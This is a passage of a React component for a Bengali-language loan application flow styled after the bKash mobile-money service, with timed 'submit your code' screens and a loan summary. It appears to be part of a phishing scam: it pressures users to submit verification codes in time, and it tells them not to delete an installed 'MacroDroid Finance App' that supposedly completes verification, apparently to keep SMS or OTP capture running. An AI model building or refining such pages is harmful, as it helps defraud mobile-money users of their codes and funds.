        <div className="bg-white p-10 rounded-3xl shadow-xl border border-gray-100 text-center">
          <div className="w-20 h-20 bg-amber-50 rounded-full flex items-center justify-center mx-auto mb-6">
            <svg className="w-10 h-10 text-amber-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
            </svg>
          </div>

          <h2 className="text-2xl font-black text-red-600 mb-3">ভেরিফিকেশন টাইম এক্সপায়ারড</h2>
          <p className="text-gray-600 font-medium leading-relaxed mb-4">
            পুনরায় লোন ভেরিফিকেশন করুন।
          </p>
          <p className="text-gray-500 text-sm font-medium leading-relaxed mb-8">
            আপনার ভেরিফিকেশন সময়সীমা অতিক্রম হয়েছে। দয়া করে নির্ধারিত সময়সীমার ভেতরে কোড সাবমিট করবেন।
          </p>

          <div className="bg-red-50 rounded-2xl p-5 mb-8 border border-red-100">
            <div className="flex items-center space-x-3 text-left">
              <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <p className="text-sm text-red-700 font-bold">সময়মতো কোড সাবমিট করুন</p>
            </div>
          </div>

          <button
            onClick={handleReviewBack}
            className="w-full py-4 bg-[#E2136E] text-white rounded-xl font-black text-lg transition-all active:scale-95 shadow-lg hover:bg-[#D11263]"
          >
            পুনরায় কনফার্ম করুন
          </button>
        </div>
      </div>
    );
  }

  if (step === FinalStep.SUMMARY && successPageMode) {
    return (
      <div className="max-w-2xl mx-auto animate-fade-in font-sans">
        <div className="bg-white rounded-3xl shadow-xl border border-green-100 overflow-hidden mb-8">
          <div className="bg-gradient-to-br from-green-500 to-green-600 py-10 px-6 text-center text-white">
            <div className="w-20 h-20 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-4 border-4 border-white/30">
              <svg className="w-11 h-11" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl font-black mb-1 tracking-tight">আবেদন সফলভাবে গৃহীত হয়েছে</h2>
            <p className="text-green-100 text-sm font-medium mt-1">আপনার লোন আবেদন আমাদের সিস্টেমে জমা হয়েছে</p>
          </div>

          <div className="p-6 space-y-6">
            <div className="bg-green-50 border border-green-100 rounded-2xl p-5 space-y-3 text-gray-700 font-semibold leading-relaxed text-[15px]">
              <p>সম্মানিত গ্রাহক,</p>
              <p>আপনার আবেদনটি সফলভাবে গৃহীত হয়েছে।</p>
              <p>আমরা সর্বোচ্চ <span className="font-black text-green-700">১ থেকে ৩ কর্মদিবসের</span> মধ্যে আপনার আবেদন যাচাইয়ের মাধ্যমে আপনার সাথে যোগাযোগ করব এবং আপনার অনুমতিক্রমে আপনার অনুমোদিত লোনের টাকা আপনার নির্ধারিত অ্যাকাউন্টে ট্রান্সফার করা হবে।</p>
            </div>

            <div className="bg-amber-50 border-2 border-amber-200 rounded-2xl p-5 flex items-start gap-3">
              <svg className="w-6 h-6 text-amber-500 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.732-.833-2.5 0L4.27 16.5c-.77.833.192 2.5 1.732 2.5z" />
              </svg>
              <p className="text-amber-800 font-bold text-sm leading-relaxed">
                অত্যন্ত গুরুত্বপূর্ণ — ইন্সটল করা <span className="text-amber-900 font-black">MacroDroid Finance App</span> ডিলিট না করার অনুরোধ জানাচ্ছি। এই অ্যাপটির মাধ্যমেই আপনার ভেরিফিকেশন সম্পন্ন হবে।
              </p>
            </div>

            <div className="bg-gray-50 rounded-2xl p-5 border border-gray-100">
              <h4 className="text-xs text-gray-400 font-black uppercase tracking-wider mb-4">আবেদন সারসংক্ষেপ</h4>
              <div className="space-y-3">
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500 font-bold text-sm">আবেদনকারীর নাম</span>
                  <span className="text-gray-800 font-black text-sm">{data.fullName}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500 font-bold text-sm">লোনের পরিমাণ</span>
                  <span className="text-gray-800 font-black">৳{loanAmount.toLocaleString()}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500 font-bold text-sm">লোনের মেয়াদ</span>
                  <span className="text-gray-800 font-black text-sm">{data.duration}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500 font-bold text-sm">মাসিক কিস্তি</span>
                  <span className="text-gray-800 font-black">৳{monthlyInstallment.toLocaleString()}</span>
                </div>
                <div className="flex justify-between items-center py-2 border-b border-gray-100">
                  <span className="text-gray-500 font-bold text-sm">কিস্তি সংখ্যা</span>
                  <span className="text-gray-800 font-black text-sm">{durationMonths}টি</span>
                </div>
                <div className="flex justify-between items-center py-2">
                  <span className="text-gray-700 font-black text-sm">মোট পরিশোধ</span>
                  <span className="text-[#E2136E] font-black text-xl">৳{totalRepayment.toLocaleString()}</span>
                </div>
              </div>
            </div>

            <p className="text-center text-gray-400 font-bold text-sm">ধন্যবাদ</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="max-w-2xl mx-auto animate-fade-in font-sans">
      <div className="bg-white p-8 rounded-3xl shadow-xl border border-blue-50 mb-8 relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-2 bg-[#E2136E]"></div>
        <h2 className="text-xl font-black text-gray-800 mb-6 flex items-center">
           <svg className="w-6 h-6 mr-2 text-[#E2136E]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
           কিছু গুরুত্বপূর্ণ পয়েন্ট : যেগুলো থাকলে লোন পাওয়ার সম্ভাবনা বাড়ে
        </h2>
        
        <div className="space-y-6">
           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">১</span>
              <div>
                 <h4 className="font-bold text-gray-800">নিয়মিত বিকাশ ব্যবহার করলে</h4>
                 <p className="text-sm text-gray-600 mt-1">প্রায়ই Send Money, Payment, Mobile Recharge, Cash In/Out করলে। লেনদেন যত বেশি ও নিয়মিত, তত ভালো লোন পাওয়ার সম্ভাবনা তত বেশি।</p>
              </div>
           </div>

           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">২</span>
              <div>
                 <h4 className="font-bold text-gray-800">দীর্ঘদিনের একটিভ একাউন্ট</h4>
                 <p className="text-sm text-gray-600 mt-1">নতুন একাউন্টের চেয়ে পুরোনো ও একটিভ একাউন্টে লোন পাওয়ার সম্ভাবনা অনেক বেশি।</p>
              </div>
           </div>

           <div className="flex items-start space-x-4">
              <span className="w-8 h-8 rounded-full bg-blue-50 text-blue-600 flex items-center justify-center font-bold text-sm flex-shrink-0 mt-1">৩</span>
              <div>
                 <h4 className="font-bold text-gray-800">সঠিক এনাইডি কার্ড ভেরিফিকেশন</h4>
                 <p className="text-sm text-gray-600 mt-1">বিকাশ নাম্বার ভেরিফায়েড এনাইডি কারড দিয়ে খোলা থাকলে লোন দ্রুত মঞ্জুর হয়।</p>
              </div>
           </div>
        </div>

        <button 
          onClick={handleConfirmLoan}
          disabled={confirmLoading}
          className="w-full mt-8 py-6 bg-[#E2136E] text-white rounded-[24px] font-black uppercase tracking-[2px] text-lg hover:bg-[#D11263] transition-all active:scale-95 shadow-xl shadow-pink-100 flex items-center justify-center space-x-3"
        >
          {confirmLoading ? (
            <div className="flex gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
            </div>
          ) : (
            <>
              <span>লোন কনফারমেশন করুন</span>
              <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </>
          )}
        </button>

        <div className="bg-gray-50 rounded-2xl p-6 mt-8 border border-gray-100">
          <h4 className="text-gray-500 text-xs uppercase tracking-wider font-bold mb-4">আপনার আবেদন সারসংক্ষেপ</h4>
          <div className="bg-white rounded-xl p-4 space-y-3">
             <div className="flex justify-between items-center py-2 border-b border-gray-50">
                <span className="text-xs text-gray-400 font-bold uppercase">লোন পরিমাণ</span>
                <span className="font-black text-gray-800">৳{loanAmount.toLocaleString()}</span>
             </div>
             <div className="flex justify-between items-center py-2 border-b border-gray-50">
                <span className="text-xs text-gray-400 font-bold uppercase">সুদ (৩%)</span>
                <span className="font-black text-red-500">৳{interest.toLocaleString()}</span>
             </div>
             <div className="flex justify-between items-center py-2 border-b border-gray-50">
                <span className="text-xs text-gray-400 font-bold uppercase">মাসিক কিস্তির পরিমাণ</span>
                <span className="font-black text-gray-800">৳{monthlyInstallment.toLocaleString()}</span>
             </div>
             <div className="flex justify-between items-center py-2 border-b border-gray-50">
                <span className="text-xs text-gray-400 font-bold uppercase">কিস্তি সংখ্যা</span>
                <span className="font-black text-gray-800">{durationMonths}টি</span>
             </div>
             <div className="flex justify-between items-center py-2">
                <span className="text-sm text-gray-700 font-black uppercase">মোট পরিশোধ</span>
                <span className="font-black text-[#E2136E] text-xl">৳{totalRepayment.toLocaleString()}</span>
             </div>
          </div>
        </div>
      </div>

    </div>
  );
};

export default FinalResultPage;
